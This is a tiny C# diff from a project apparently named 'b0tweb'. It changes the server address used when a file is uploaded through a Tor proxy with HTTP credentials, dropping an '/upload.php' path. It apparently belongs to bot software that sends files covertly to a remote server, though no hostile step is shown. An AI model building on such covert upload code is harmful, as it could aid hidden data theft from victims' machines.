@@ -22,7 +22,7 @@ namespace b0tweb
                 TorProxy.Host,
                 TorProxy.Port,
                 filePath,
-                Configuration.HTTPServer + "/upload.php",
+                Configuration.HTTPServer,
                 Configuration.HTTPUsername,
                 Configuration.HTTPPassword
             );
